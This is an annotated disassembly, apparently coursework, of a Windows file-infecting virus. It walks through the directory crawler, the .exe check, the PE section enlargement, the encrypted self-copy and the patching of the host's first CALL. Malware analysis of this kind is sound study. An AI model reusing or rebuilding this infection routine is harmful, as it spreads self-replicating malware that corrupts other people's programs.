.data:0040333B                 jnz     short restartCharacterScan ; if the character is not a "." then go back to the character scan at the next character
.data:0040333D                 jmp     short RipOffExtension ; the cursor is now at the file extension and we can commence ripping off the extension to compare it to ".exe"
.data:0040333F ; ---------------------------------------------------------------------------
.data:0040333F
.data:0040333F restartCharacterScan:                   ; CODE XREF: CharacterScanSetup+12\u2191j
.data:0040333F                 jmp     short CharacterScan
.data:00403341 ; ---------------------------------------------------------------------------
.data:00403341
.data:00403341 RipOffExtension:                        ; CODE XREF: CharacterScanSetup+14\u2191j
.data:00403341                 xor     eax, eax        ; reset eax
.data:00403343                 mov     al, 2Eh ; '.'   ; set al to "."
.data:00403345                 rol     eax, 8          ; rotate left command. just like shift, but the bits on the left end get carried to the right end
.data:00403345                                         ; this rolls the "." to the next byte
.data:00403348                 lodsb                   ; grabs the next character. this is the first letter of the extension
.data:00403349                 rol     eax, 8          ; rolls the character to the left a byte.
.data:00403349                                         ; this puts the ".A" out of the way for the next load
.data:00403349                                         ; "A" is a placeholder
.data:0040334C                 lodsb                   ; loads the next character. example state of eax is ".ex"
.data:0040334D                 rol     eax, 8          ; rotates the characters to the left to make room for the next character
.data:00403350                 lodsb                   ; loads the last character of the file extension into eax (example value could be ".exe")
.data:00403351                 cmp     eax, 2E657865h  ; compares the extension that it just pulled off the end of the filename against the pseudo string ".exe"
.data:00403356                 jnz     short notEXE    ; if they are not equal, then this file's extension is not exe
.data:00403356                                         ; this malware doesn't care about it anymore
.data:00403356                                         ; sets output value to 0 and returns
.data:00403358                 mov     eax, 1          ; if they are equal, we have found an executable.
.data:00403358                                         ; set output value to 1 and return
.data:0040335D                 jmp     short JustAReturn ; jump to return statement
.data:0040335F ; ---------------------------------------------------------------------------
.data:0040335F
.data:0040335F notEXE:                                 ; CODE XREF: CharacterScanSetup+2D\u2191j
.data:0040335F                 mov     eax, 0
.data:00403364
.data:00403364 JustAReturn:                            ; CODE XREF: CharacterScanSetup+C\u2191j
.data:00403364                                         ; CharacterScanSetup+34\u2191j
.data:00403364                 retn
.data:00403364 CharacterScanSetup endp
.data:00403364
.data:00403365
.data:00403365 ; =============== S U B R O U T I N E =======================================
.data:00403365
.data:00403365
.data:00403365 RecursiveDirectoryCrawler proc near     ; CODE XREF: LuciusStart+2F4\u2191p
.data:00403365                                         ; RecursiveDirectoryCrawler+97\u2193p
.data:00403365                 push    ebx             ; push ebx to preserve it for later
.data:00403366                 mov     ebx, esp        ; move esp into ebx to preserve it
.data:00403366                                         ; about to hard code something into esp
.data:00403366                                         ; otherwise the old stack would be lost
.data:00403368                 add     esp, 0FFFFFFF8h ; set the stack to an arbitrary high value that wont blow up other stuff any time soon
.data:0040336B                 push    ebx             ; store ebx to preserve its value
.data:0040336C                 push    13Eh            ; size of heap space to allocate
.data:00403371                 push    40h ; '@'       ; flags for heap allocation call
.data:00403373                 mov     eax, [ebp+40179Fh] ; moves pointer to GlobalAlloc function into eax
.data:00403379                 call    eax             ; calls the GlobalAlloc function.
.data:00403379                                         ; GlobalAlloc is a heap management tool that currently isn't recommended for use
.data:00403379                                         ; this call allocates memory with the 0x40 flag set.
.data:00403379                                         ; that flag specifies that the memory be initialized to zero
.data:00403379                                         ; the other parameter is the number of bytes to allocate, 13Eh
.data:0040337B                 pop     ebx             ; restores ebx though it wasn't changed explicitly
.data:0040337C                 mov     [ebx-8], eax    ; overwrites the unclaimed space under the old stack with the pointer to the heap object
.data:0040337F                 push    ebx             ; pushes the old stack pointer
.data:00403380                 push    dword ptr [ebx-8] ; pushes the address of the pointer to the heap object as a parameter
.data:00403383                 lea     eax, [ebp+401BEDh] ; loads a pointer to the string "*.*" as a parameter to the stack
.data:00403389                 push    eax             ; pushes that pointer as a parameter
.data:0040338A                 mov     eax, [ebp+4018BDh] ; loads pointer to function FindFirstFile into eax
.data:00403390                 call    eax             ; calls FindFirstFile
.data:00403390                                         ; this function takes two parameters in,
.data:00403390                                         ; the first is a search string which in this case is a wildcard expression that matches just about anything
.data:00403390                                         ; the second parameter is a pointer to a data object that can contain information about the found file
.data:00403392                 pop     ebx             ; preserves ebx
.data:00403393                 or      eax, eax        ; this is purely to change flags and test for a failed find
.data:00403393                                         ; this or statement does not change the value of eax
.data:00403393                                         ; eax currently holds the handle to the findObject structure
.data:00403393                                         ; that pointer is used for subsequent finds
.data:00403395                 jnz     short SuccessOnFind ; the find function did not fail, so here's where we handle that
.data:00403397                 mov     eax, 0FFFFFFFFh ; set an error code into eax
.data:0040339C                 jmp     findFailed
.data:004033A1 ; ---------------------------------------------------------------------------
.data:004033A1
.data:004033A1 SuccessOnFind:                          ; CODE XREF: RecursiveDirectoryCrawler+30\u2191j
.data:004033A1                 mov     [ebx-4], eax    ; moves the findfile handler onto the old stack
.data:004033A4                 mov     eax, [ebx-8]    ; check the second-to-last popped value from the old stack
.data:004033A7                 cmp     byte ptr [eax+2Ch], 2Eh ; '.' ; compare that value as a pointer to memory with the hard coded value 2E
.data:004033AB                 jnz     short FindAnother
.data:004033AD                 jmp     short $+2
.data:004033AF ; ---------------------------------------------------------------------------
.data:004033AF
.data:004033AF FindAnother:                            ; CODE XREF: RecursiveDirectoryCrawler+46\u2191j
.data:004033AF                                         ; RecursiveDirectoryCrawler+48\u2191j ...
.data:004033AF                 push    ebx             ; pushes ebx for preservation
.data:004033B0                 push    dword ptr [ebx-8] ; pushes the heap object created earlier as the input parameter for the found file's data
.data:004033B3                 mov     eax, [ebx-4]    ; moves the findfile handler back into eax
.data:004033B6                 push    eax             ; pushes the handler as a parameter
.data:004033B7                 mov     eax, [ebp+4018E4h] ; loads pointer to function findNextfile
.data:004033BD                 call    eax             ; calls findNextFile
.data:004033BF                 pop     ebx             ; restores ebx to previously popped value
.data:004033C0                 or      eax, eax        ; or's the eax register to update flags
.data:004033C2                 jnz     short determineDirectory ; if the zero flag is not set, there was no error
.data:004033C4                 mov     eax, 0FFFFFFFFh ; otherwise set an error value and handle the error
.data:004033C9                 jmp     short findFailed ; jumps to a handler for an error
.data:004033CB ; ---------------------------------------------------------------------------
.data:004033CB
.data:004033CB determineDirectory:                     ; CODE XREF: RecursiveDirectoryCrawler+5D\u2191j
.data:004033CB                 mov     eax, [ebx-8]    ; moves heap object holding file data into eax
.data:004033CE                 lea     ecx, [eax+2Ch]  ; loads pointer to filename string into ecx
.data:004033D1                 push    ebx             ; preserve ebx
.data:004033D2                 push    ecx             ; pushes the pointer to the filename string as a parameter to the getfileattributes function
.data:004033D3                 mov     eax, [ebp+4018D3h] ; moves pointer to GetFileAttribute function into eax
.data:004033D9                 call    eax             ; calls GetFileAttributes
.data:004033DB                 pop     ebx             ; restore ebx
.data:004033DC                 cmp     eax, 10h        ; compares the return value of GetFileAttributes to 10h
.data:004033DC                                         ; the function returns that when pointed at a directory
.data:004033DF                 jnz     short FoundNonDirectory ; if not zero, then the found file must not be a directory, jump
.data:004033E1                 mov     eax, [ebx-8]    ; grabs file result handle
.data:004033E4                 cmp     byte ptr [eax+2Ch], 2Eh ; '.' ; tests if the first byte of the filename is "."
.data:004033E4                                         ; this may be testing if it is a hidden directory
.data:004033E8                 jnz     short EnterDirectory ; if not, then the malware enters the directory, infects all the contained files, and returns to this directory
.data:004033EA                 jmp     short FindAnother ; otherwise, looks for a different target
.data:004033EA ; ---------------------------------------------------------------------------
.data:004033EC                 dw 24EBh
.data:004033EE ; ---------------------------------------------------------------------------
.data:004033EE
.data:004033EE EnterDirectory:                         ; CODE XREF: RecursiveDirectoryCrawler+83\u2191j
.data:004033EE                 push    ebx             ; preserves ebx
.data:004033EF                 lea     ecx, [eax+2Ch]  ; loads the pointer to the filename into ecx
.data:004033F2                 push    ecx             ; pushes filename to stack as parameter of setcurrentdirectory
.data:004033F3                 mov     eax, [ebp+4017FDh] ; moves pointer to SetCurrentDirectory function to eax
.data:004033F9                 call    eax             ; calls the setCurrentDirectory function with the found directory's path as a parameter
.data:004033F9                                         ; this navigates to the directory to look for more files
.data:004033FB                 pop     ebx             ; pops ebx back into itself
.data:004033FC                 call    RecursiveDirectoryCrawler ; searches for files within this directory
.data:00403401                 push    ebx             ; preserves ebx
.data:00403402                 lea     ecx, [ebp+401BF1h] ; loads ".." string pointer into register
.data:00403408                 push    ecx             ; pushes string as parameter
.data:00403409                 mov     eax, [ebp+4017FDh] ; moves pointer to SetCurrentDirectory function into register
.data:0040340F                 call    eax             ; calls setCurrentDirectory with ".." as parameter
.data:0040340F                                         ; this moves it out of the directory it just entered earlier
.data:00403411                 pop     ebx             ; restores ebx
.data:00403412                 jmp     short FindAnother
.data:00403412 ; ---------------------------------------------------------------------------
.data:00403414                 dw 1FEBh
.data:00403416 ; ---------------------------------------------------------------------------
.data:00403416
.data:00403416 FoundNonDirectory:                      ; CODE XREF: RecursiveDirectoryCrawler+7A\u2191j
.data:00403416                 push    ebx             ; set asside ebx. this is getting excessive
.data:00403417                 mov     eax, [ebx-8]    ; moves file data pointer into eax
.data:0040341A                 pop     ebx             ; preserves ebx
.data:0040341B                 lea     ecx, [eax+2Ch]  ; loads the location of the filename into register
.data:0040341E                 mov     [ebp+401C08h], ecx ; moves the pointer to the filename into memory for later
.data:00403424                 call    CharacterScanSetup ; with the filename string ready, this call will strip off the extension and check if it is ".exe"
.data:00403424                                         ; if it is, it will return 1
.data:00403424                                         ; if it is not, it will return 0
.data:00403424                                         ; Errors like the lack of extension will result in returning -1
.data:00403429                 cmp     eax, 1          ; is it an executable?
.data:0040342C                 jnz     short JumpToSecondFind ; if not, repeat the file search and find another target
.data:0040342E                 push    ebx             ; the file is an executable! push ebx to preserve
.data:0040342F                 call    ExecutableTargetExploit ; this is where the actual infection logic comes in
.data:00403434                 pop     ebx             ; restore ebx
.data:00403435
.data:00403435 JumpToSecondFind:                       ; CODE XREF: RecursiveDirectoryCrawler+C7\u2191j
.data:00403435                 jmp     FindAnother     ; find another target because why not?
.data:0040343A ; ---------------------------------------------------------------------------
.data:0040343A
.data:0040343A findFailed:                             ; CODE XREF: RecursiveDirectoryCrawler+37\u2191j
.data:0040343A                                         ; RecursiveDirectoryCrawler+64\u2191j
.data:0040343A                 mov     esp, ebx        ; restores the stack to its former value
.data:0040343C                 pop     ebx             ; pops the old ebx value back into itself
.data:0040343D                 retn                    ; return from the find iteration handler
.data:0040343D RecursiveDirectoryCrawler endp
.data:0040343D
.data:0040343E
.data:0040343E ; =============== S U B R O U T I N E =======================================
.data:0040343E
.data:0040343E
.data:0040343E ExecutableTargetExploit proc near       ; CODE XREF: RecursiveDirectoryCrawler+CA\u2191p
.data:0040343E                 push    0               ; templatefile parameter
.data:0040343E                                         ; no imported attributes
.data:00403440                 push    80h ; '�'       ; FlagsAndAttributes parameter
.data:00403440                                         ; file attribute normal
.data:00403445                 push    4               ; CreationDisposition parameter
.data:00403445                                         ; Open always meaning that this function will open if it exists, or create if it doesn't
.data:00403445                                         ; we know this file exists so it will open it
.data:00403447                 push    0               ; SecurityAttributes parameter
.data:00403447                                         ; this open handler can't be shared by child processes
.data:00403449                 push    3               ; Sharemode parameter
.data:00403449                                         ; File share read and write allowed
.data:0040344B                 push    0C0000000h      ; desiredAccess parameter
.data:0040344B                                         ; generic read and generic write
.data:00403450                 mov     eax, [ebp+401C08h] ; moves pointer to filename string into eax
.data:00403456                 push    eax             ; pushes filename string as parameter
.data:00403457                 mov     eax, [ebp+4017BDh] ; moves pointer to createfile function into eax
.data:0040345D                 call    eax             ; calls CreateFile function with the following parameters:
.data:0040345D                                         ; open the specified file with read/write perms
.data:0040345D                                         ; the other parameters don't really have a meaningful effect as far as the malware is concerned
.data:0040345F                 mov     [ebp+401BA9h], eax ; stores file handler in memory for later
.data:00403465                 cmp     eax, 0FFFFFFFFh ; checks for -1, if so there was a creation error
.data:00403468                 jnz     short createFileMapping ; if not error, jump
.data:0040346A                 mov     ebx, 1          ; there was an error so set ebx to 1 and return
.data:0040346F                 retn                    ; returns from the file manipulation call
.data:00403470 ; ---------------------------------------------------------------------------
.data:00403470
.data:00403470 createFileMapping:                      ; CODE XREF: ExecutableTargetExploit+2A\u2191j
.data:00403470                 xor     ebx, ebx        ; resets ebx
.data:00403472                 push    0
.data:00403474                 push    eax             ; pushes the opened file handle as a parameter
.data:00403475                 mov     eax, [ebp+4018ABh] ; moves pointer to GetFileSize function into eax
.data:0040347B                 call    eax             ; calls GetFileSize with the following parameters:
.data:0040347D                 add     eax, 0C31h      ; adds C31h to the size
.data:00403482                 add     eax, 1000h      ; adds 1000h to the size
.data:00403487                 mov     [ebp+401C0Ch], eax ; stores the calculated size into memory for later
.data:0040348D                 push    0               ; pushes 0 as parameter which sets the file mapping name as null
.data:0040348F                 mov     eax, [ebp+401C0Ch] ; grabs that calculated size again
.data:00403495                 push    eax             ; pushes the calculated size as a parameter.
.data:00403495                                         ; this is the size of the mapping.
.data:00403496                 push    0               ; this is also the size of the mapping, just the high order bytes of the number.
.data:00403496                                         ; it's zero because it assumes a certain size
.data:00403498                 push    4               ; this parameter set the flProtect parameter.
.data:00403498                                         ; 4 dictates its read/write
.data:0040349A                 push    0               ; this null value determines the mapping can't be inherited by child processes
.data:0040349C                 mov     eax, [ebp+401BA9h] ; grabs file handler pointer from memory
.data:004034A2                 push    eax             ; pushes file handle as parameter
.data:004034A3                 mov     eax, [ebp+4017D3h] ; gets pointer to CreateFileMapping function
.data:004034A9                 call    eax             ; calls CreateFileMapping function
.data:004034A9                                         ; this maps the opened file into memory with extra headroom allocated for what I suspect to be viral infection
.data:004034AB                 mov     [ebp+401BADh], eax ; stores file mapping handle in memory for later
.data:004034B1                 push    dword ptr [ebp+401C0Ch] ; grabs calculated file size as the size of the mapping
.data:004034B7                 push    0               ; low value of mapping offset
.data:004034B7                                         ; this combined with the high value of zero means the mapping starts at the beginning of the file
.data:004034B9                 push    0               ; high offset value zero
.data:004034BB                 push    2               ; this pertains to the read/write permissions of the mapping
.data:004034BD                 mov     eax, [ebp+401BADh] ; grabs pointer to mapping handle
.data:004034C3                 push    eax             ; pushes mapping handle as parameter
.data:004034C4                 mov     eax, [ebp+4017E5h] ; MapViewOfFile function pointer
.data:004034CA                 call    eax             ; calls the MapViewOfFile function
.data:004034CC                 mov     [ebp+401BB1h], eax ; stores the handle for the mapping into memory
.data:004034D2                 mov     edi, eax        ; moves the start of the mapping into the destination register
.data:004034D4                 xor     eax, eax        ; resets eax
.data:004034D6                 mov     ax, [edi]       ; grabs first byte of the target file into ax
.data:004034D9                 add     edi, [edi+3Ch]  ; 3Ch offset into the executable should give the offset to the "New EXE header"
.data:004034DC                 add     edi, 4          ; increments the pointer 4 bytes into the NT Headers
.data:004034DF                 xor     ecx, ecx        ; resets the ecx
.data:004034E1                 mov     cx, [edi+2]     ; this points to CEh which is the number of sections in the PE
.data:004034E5                 mov     [ebp+401BC1h], ecx ; stores the number of sections in memory for later
.data:004034EB                 add     edi, 14h        ; this increments the edi to the optional headers
.data:004034EE                 mov     [ebp+401BC5h], edi ; stores a pointer to the image, optional header in memory
.data:004034F4                 mov     eax, [edi+40h]  ; this targets 120h in the headers where it is labeled "checksum"
.data:004034F7                 cmp     eax, 0FFFFh     ; compares against -1
.data:004034FC                 jnz     short locateTextSection ; is it -1
.data:004034FC                                         ; if so, we don't want anything to do with it
.data:004034FC                                         ; if not jump
.data:004034FE                 mov     eax, [ebp+401BB1h] ; grab mapping view handle
.data:00403504                 push    eax             ; pushes that pointer as a parameter
.data:00403505                 mov     eax, [ebp+40187Ah] ; loads unmap view of file function pointer
.data:0040350B                 call    eax             ; calls unmap view of file function on the file that was just mapped
.data:0040350D                 mov     eax, [ebp+401BADh] ; grabs mapping file result pointer
.data:00403513                 push    eax             ; pushes as parameter
.data:00403514                 mov     eax, [ebp+40188Ah] ; grabs closeHandle function pointer
.data:0040351A                 call    eax             ; calls closeHandle function on mapping handle
.data:0040351C                 mov     eax, [ebp+401BA9h] ; grabs createFile result poitner
.data:00403522                 push    eax             ; pushes as parameter
.data:00403523                 mov     eax, [ebp+40188Ah] ; grabs closeHandle function pointer
.data:00403529                 call    eax             ; closes the file
.data:0040352B                 add     esp, 4
.data:0040352E                 retn
.data:0040352F ; ---------------------------------------------------------------------------
.data:0040352F
.data:0040352F locateTextSection:                      ; CODE XREF: ExecutableTargetExploit+BE\u2191j
.data:0040352F                 mov     eax, [edi+1Ch]  ; moves the value for the Image base into eax
.data:00403532                 mov     [ebp+401BD1h], eax ; stores the image base into memory for later
.data:00403538                 mov     eax, [edi+10h]  ; moves start address into eax
.data:0040353B                 mov     [ebp+401BC9h], eax ; saves start addres in memory for later
.data:00403541                 add     edi, 0E0h ; '�' ; moves the edi pointer to the start of the .text section header
.data:00403547                 mov     [ebp+401C10h], edi ; stores the pointer to the start of the .text section header in memory for later
.data:0040354D                 mov     edi, [ebp+401C10h] ; really doesn't change anything as the
.data:0040354D                                         ; the memory value that is being moved into edi was just moved from edi in the last instruction
.data:00403553                 mov     ecx, [ebp+401BC1h] ; grabs the number of sections value that was stored in memory earlier
.data:00403559                 mov     edx, 0          ; zero out edx
.data:0040355E                 mov     ebx, 0          ; zero out ebx
.data:00403563
.data:00403563 checkSectionCountAndJump:               ; CODE XREF: ExecutableTargetExploit+136\u2193j
.data:00403563                 or      ecx, ecx        ; update flags based on the number of sections in the target PE
.data:00403565 edi is 1C0h for the example exe
.data:00403565                 jnz     short sectionHandler ; the value should be nonzero, if it is take this jump
.data:00403567                 jmp     short noSectionsLeft ; this jump is taken if all the sections are cycled through
.data:00403569 ; ---------------------------------------------------------------------------
.data:00403569
.data:00403569 sectionHandler:                         ; CODE XREF: ExecutableTargetExploit+127\u2191j
.data:00403569                 cmp     edx, [edi+14h]  ; this grabs the pointer to the raw data edx is zero so this is seeing if the pointer is null
.data:0040356C                 jnb     short targetNextSection ; if the pointer doesn't exist, take this jump
.data:0040356E                 mov     ebx, edi        ; otherwise, store this as the last section with a legit pointer
.data:00403570
.data:00403570 targetNextSection:                      ; CODE XREF: ExecutableTargetExploit+12E\u2191j
.data:00403570                 add     edi, 28h ; '('  ; and move the base up to the next section
.data:00403573                 dec     ecx             ; reduce the running count of sections
.data:00403574                 jmp     short checkSectionCountAndJump
.data:00403576 ; ---------------------------------------------------------------------------
.data:00403576
.data:00403576 noSectionsLeft:                         ; CODE XREF: ExecutableTargetExploit+129\u2191j
.data:00403576                 mov     edi, ebx        ; set edi to the base of the last section with a legit raw data pointer
.data:00403578                 mov     eax, [ebp+401BC5h] ; grabs the pointer to the optional image header
.data:0040357E                 mov     ebx, [eax+24h]  ; grabs the file alignment offset
.data:00403581                 mov     [ebp+401BD9h], ebx ; stores that dword off for later
.data:00403587                 mov     ebx, [eax+20h]  ; grabs section alignment
.data:0040358A                 mov     [ebp+401BDDh], ebx ; stores for later
.data:00403590                 mov     eax, [ebp+401BB1h] ; grabs the pointer to the mapping view
.data:00403596                 add     eax, [edi+14h]  ; adds the offset into this section's start
.data:00403599                 add     eax, [edi+8]    ; adds the number of bytes actually in use putting the pointer at the start of unused space
.data:0040359C                 mov     [ebp+40175Fh], eax ; moves this pointer into memory for later
.data:004035A2                 mov     eax, [edi+0Ch]  ; grabs the RVA of the section
.data:004035A2                                         ; this is the offset from the Virtual base address that this section will be loaded into memory
.data:004035A5                 add     eax, [edi+8]    ; adds number of bytes actually in use
.data:004035A5                                         ; to calculate a value that is the offset from the base address to the beginning of the unused data
.data:004035A8                 mov     [ebp+401763h], eax ; moves this offset into memory
.data:004035AE                 mov     eax, [edi+8]    ; grabs size of actually used space in this section
.data:004035B1                 add     eax, 0C31h      ; adds size of packed malware to old size
.data:004035B6                 add     eax, 65h ; 'e'  ; adds size of unpacking algorithm to old size
.data:004035BB                 mov     [edi+8], eax    ; overwrites this field of the section header with this larger value
.data:004035BB                                         ; meant to accommodate the soon-to-be appended code
.data:004035BE                 push    edi             ; pushes the pointer to the base of the target header to the stack for preservation
.data:004035BF                 mov     edi, [ebp+401BC5h] ; grabs file alignment offset
.data:004035C5                 mov     eax, [edi+38h]  ; grabs size of image
.data:004035C8                 add     eax, 0C31h      ; adds the packed size to the image size
.data:004035CD                 add     eax, 65h ; 'e'  ; adds the unpacking algorithm size to image size
.data:004035D2                 pop     edi             ; restores edi to point at the start of the targeted section
.data:004035D3                 mov     eax, [edi+10h]  ; grabs size of raw data in section
.data:004035D6                 add     eax, 0C31h      ; adds size of packed malware
.data:004035DB                 add     eax, 65h ; 'e'  ; adds size of unpacking algorithm
.data:004035E0                 push    eax             ; pushes that sum to stack
.data:004035E1                 xor     edx, edx        ; resets edx
.data:004035E3                 mov     ebx, [ebp+401BD9h] ; grabs file alignment
.data:004035E9                 div     ebx             ; divides the size of the raw section+malware by the file alignment
.data:004035EB                 pop     edx             ; pops the sum into edx
.data:004035EC                 add     eax, edx        ; adds the size of the malware
.data:004035EE                 mov     [edi+10h], eax  ; overwrites with new size of raw data including the malware
.data:004035F1                 mov     edi, [ebp+40175Fh] ; moves pointer to start of unused section into destination register
.data:004035F7                 mov     esi, offset start ; moves source register to point at the entry point of this executable
.data:004035FC                 add     esi, ebp        ; adds the offset between the entry point and the start of the malware onto the source register
.data:004035FE                 mov     ecx, 0C31h      ; moves size of packed malware into counter register
.data:00403603                 mov     ecx, 61h ; 'a'  ; it's got to move the first 61h bytes then the encryption seed then the rest
.data:00403608                 rep movsb               ; copies the first 61h bytes of the malware
.data:00403608                                         ; code into the unused data of the target executable's section
.data:0040360A                 mov     eax, [ebp+401BE5h] ; gets the result of the TickCount function call from earlier
.data:00403610                 stosd                   ; writes that dword where the string copy left off
.data:00403611                 add     esi, 4          ; adds 4 to the source register to make up for the increment the edi just got from stosd
.data:00403614                 mov     ecx, 0C31h      ; moves size of the packed malware into count register
.data:00403619 this is the same packing algorithm that unpacked this malware earlier.
.data:00403619 this part is now repacking the bytes and writing them to the target exe
.data:00403619
.data:00403619 RepackingAndWriting:                    ; CODE XREF: ExecutableTargetExploit+214\u2193j
.data:00403619                 lodsb                   ; grab byte from unpacked malware
.data:0040361A                 push    eax
.data:0040361B                 push    ecx             ; retain count value between loops
.data:0040361C                 mov     eax, [ebp+401BE5h] ; load in carryover value
.data:00403622 I'm not going to comment the actual packing algorithm for the same
.data:00403622 reason we weren't expected to comment the unpacking algorithm. I'm aware of what
.data:00403622 its end result is, and the actual nitty-gritty of the algorithm is beyond the
.data:00403622 scope of this course
.data:00403622                 xor     edx, edx
.data:00403624                 mov     ecx, 1F31Dh
.data:00403629                 div     ecx
.data:0040362B                 mov     ecx, eax
.data:0040362D                 mov     eax, 41A7h
.data:00403632                 mul     edx
.data:00403634                 mov     edx, ecx
.data:00403636                 mov     ecx, eax
.data:00403638                 mov     eax, 0B14h
.data:0040363D                 mul     edx
.data:0040363F                 sub     ecx, eax
.data:00403641                 xor     edx, edx
.data:00403643                 mov     eax, ecx
.data:00403645                 mov     [ebp+401BE5h], ecx ; store carryover value into memory for next loop
.data:0040364B                 mov     edx, eax
.data:0040364D                 pop     ecx
.data:0040364E                 pop     eax
.data:0040364F                 xor     al, dl
.data:00403651                 stosb                   ; writes encrypted byte to target exe compromised section
.data:00403652                 loop    RepackingAndWriting
.data:00403654                 mov     [ebp+40176Bh], edi ; stores the ending location of the malware copying to memory
.data:0040365A                 mov     edi, [ebp+401C10h] ; loads in text header section pointer
.data:00403660                 mov     ecx, [ebp+401BC1h] ; loads in number of sections
.data:00403666
.data:00403666 examineSectionsForBaseValue:            ; CODE XREF: ExecutableTargetExploit+252\u2193j
.data:00403666                 or      ecx, ecx        ; updates flags based on ecx
.data:00403668                 jnz     short checkThisSectionBase ; jumps if ecx isn't zero. should at least hit this once
.data:0040366A                 or      edi, 0FFFFFFFFh
.data:0040366D                 jmp     short correctSectionBaseValueFound
.data:0040366F ; ---------------------------------------------------------------------------
.data:0040366F
.data:0040366F checkThisSectionBase:                   ; CODE XREF: ExecutableTargetExploit+22A\u2191j
.data:0040366F                 mov     eax, [ebp+401BC9h] ; loads in start address value
.data:00403675                 cmp     eax, [edi+0Ch]  ; compares it against the header's RVA
.data:00403678                 jb      short thisSectionNoGood ; if the start address is less than the RVA, jump
.data:0040367A                 mov     ebx, [edi+0Ch]  ; grab the header's RVA
.data:0040367D                 add     ebx, [edi+8]    ; add the section's virtual size
.data:00403680                 cmp     eax, ebx        ; check it against the start address value again
.data:00403682                 jnb     short thisSectionNoGood ; if the start address is greater than that sum, jump
.data:00403684                 mov     [ebp+401BD5h], edi ; move the section header address into  the stored value of the image base
.data:0040368A                 jmp     short correctSectionBaseValueFound
.data:0040368C ; ---------------------------------------------------------------------------
.data:0040368C
.data:0040368C thisSectionNoGood:                      ; CODE XREF: ExecutableTargetExploit+23A\u2191j
.data:0040368C                                         ; ExecutableTargetExploit+244\u2191j
.data:0040368C                 dec     ecx             ; decrement the count of sections
.data:0040368D                 add     edi, 28h ; '('  ; move the pointer to the next section
.data:00403690                 jmp     short examineSectionsForBaseValue ; look through the next section
.data:00403692 ; ---------------------------------------------------------------------------
.data:00403692
.data:00403692 correctSectionBaseValueFound:           ; CODE XREF: ExecutableTargetExploit+22F\u2191j
.data:00403692                                         ; ExecutableTargetExploit+24C\u2191j
.data:00403692                 mov     ecx, [edi+10h]  ; grabs size of raw data
.data:00403695                 mov     eax, [edi+14h]  ; grabs pointer to raw data
.data:00403698                 push    eax             ; pushes that pointer
.data:00403699                 mov     eax, [edi+0Ch]  ; grabs the RVA (for this section)
.data:0040369C                 add     eax, [ebp+401BD1h] ; adds the image base
.data:004036A2                 sub     eax, [edi+14h]  ; subtracts the pointer to the raw data
.data:004036A5                 sub     eax, [ebp+401BB1h] ; subtracts the value it just added
.data:004036AB                 mov     [ebp+401767h], eax ; stores the difference between the raw data pointer and RVA in memory
.data:004036B1                 pop     eax             ; restores pointer to raw data
.data:004036B2                 add     eax, [ebp+401BB1h] ; adds the image base
.data:004036B8                 mov     [ebp+401BCDh], eax ; stores this sum in memory for later
.data:004036BE                 mov     edi, eax        ; moves the destination register to this location (start of code for target)
.data:004036C0                 xor     eax, eax        ; reset eax
.data:004036C2                 mov     al, 0E8h ; '�'  ; the opcode for CALL is moved into eax
.data:004036C4                 repne scasb             ; this finds the first occurrence of a call in the target executable's code
.data:004036C4                                         ; edi now points to it. (near CALL specifically)
.data:004036C6                 dec     edi             ; decrement it so that it points to the byte just before it
.data:004036C7                 add     [ebp+401767h], edi ; stores that pointer in memory for later overwriting data that was never used
.data:004036CD                 inc     edi             ; increment edi back up to point at the CALL
.data:004036CE                 mov     esi, edi        ; sets the source register to point at the first CALL instruction in the memory mapped target executable
.data:004036D0                 lodsd                   ; loads the dword starting there and the operand with it
.data:004036D1                 mov     edx, [ebp+40176Bh] ; pulls the ending location of the malware on the target into edx
.data:004036D7                 mov     [ebp+40176Bh], eax ; stores this CALL instruction in memory
.data:004036DD                 mov     eax, [ebp+401763h] ; pulls in offset to start of section's previously unused data
.data:004036E3                 add     eax, [ebp+401BD1h] ; adds image base
.data:004036E9                 sub     eax, [ebp+401767h] ; subtracts the address just before the call instruction
.data:004036EF                 sub     eax, 5          ; calculates the difference between the first CALL opcode and the start of the malware.
.data:004036F2                 stosd                   ; that new distance is written over the CALL's previous distance now that instruction will call the virus
.data:004036F3                 push    edi             ; pushes edi for retention
.data:004036F4                 mov     eax, [ebp+401767h] ; grabs the address of the CALL instruction
.data:004036FA                 add     eax, [ebp+40176Bh] ; adds the operand of that CALL instruction to the instruction's memory location
.data:00403700                 add     eax, 5          ; adding 5 gives a sum which is equal to the memory location the exe would've jumped to if the CALL wasn't infected
.data:00403703                 mov     [ebp+40176Bh], eax ; stores the original CALL absolute destination in memory for later
.data:00403709                 pop     edi             ; restores edi to point at the first CALL instruction of the target exe
.data:0040370A                 mov     edi, edx        ; moves ending location of copied malware into edi
.data:0040370C                 push    eax             ; pushes absolute location of the new host exe's first CALL
.data:0040370D                 mov     al, 68h ; 'h'   ; loads the opcode for PUSH ImmediateValue into al
.data:0040370F                 stosb                   ; writes that instruction into the host exe
.data:00403710                 pop     eax             ; restores eax
.data:00403711                 stosd                   ; writes the original CALL destination to the end of the new host exe
.data:00403711                                         ; this gives the PUSH the absolute destination of where CALL near would've taken the host
.data:00403711                                         ; when the host runs, it pushes an absolute address of where CALL should have taken the host pre-infection
.data:00403712                 mov     al, 0C3h ; '�'  ; writes the RETN instruction to the end of the host
.data:00403712                                         ; this will pop the first value off the stack into eip
.data:00403712                                         ; this sets up execution to pick up what the host wanted to CALL originally
.data:00403712                                         ; the stack should also still have the return address of that original CALL because all we did was replace the operand
.data:00403714                 stosb                   ; writes the opcode for the reasons in the line above
.data:00403715
.data:00403715 repeatUntil11Divisible:                 ; CODE XREF: ExecutableTargetExploit+2E9\u2193j
.data:00403715                 call    psuedoRando
.data:0040371A                 mov     ebx, 0Bh        ; grabs the literal B to compare modulus
.data:0040371F                 div     ebx             ; divide the result of pseudo rando by b
.data:00403721                 cmp     edx, 0          ; is the result divisible by 11? (edx holds
.data:00403721                                         ; the remainder of division
.data:00403724                 jz      short paddingDoneCloseFile
.data:00403726                 stosd                   ; result of the psuedo random generator is written to the end of the malware copy as a sort of padding
.data:00403727                 jmp     short repeatUntil11Divisible
.data:00403729 ; ---------------------------------------------------------------------------
.data:00403729
.data:00403729 paddingDoneCloseFile:                   ; CODE XREF: ExecutableTargetExploit+2E6\u2191j
.data:00403729                 mov     eax, [ebp+401BB1h] ; grab mapping view handle
.data:0040372F                 push    eax             ; push as parameter
.data:00403730                 mov     eax, [ebp+40187Ah] ; grab unmapViewOfFile function pointer
.data:00403736                 call    eax             ; call function to unmap this file
.data:00403738                 mov     eax, [ebp+401BADh] ; mappingFileResult handle grabbed
.data:0040373E                 push    eax             ; push the handle as a parameter
